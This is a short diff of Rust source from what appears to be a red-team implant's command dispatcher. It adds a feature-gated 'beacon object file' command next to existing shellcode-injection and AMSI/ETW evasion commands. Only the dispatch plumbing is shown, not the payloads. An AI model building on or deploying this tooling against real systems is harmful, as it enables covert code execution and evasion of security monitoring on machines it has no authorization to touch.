@@ -1,4 +1,7 @@
 use link_common::dispatch::dispatch_common;
+
+#[cfg(feature = "cmd-bof")]
+use crate::bof::bof_cmd;
 use std::env;
 use std::process::Command;
 
@@ -78,6 +81,8 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
             let sc = link_common::extract_param(parameters, "shellcode");
             inject_cmd(&format!("{} {}", pid, sc)).into()
         }
+        #[cfg(feature = "cmd-bof")]
+        link_common::cmds::BOF => bof_cmd(parameters).into(),
         link_common::cmds::AMSI_ETW if cfg!(feature = "cmd-amsi-etw") => {
             crate::amsi_etw::amsi_etw_cmd(parameters).into()
         }
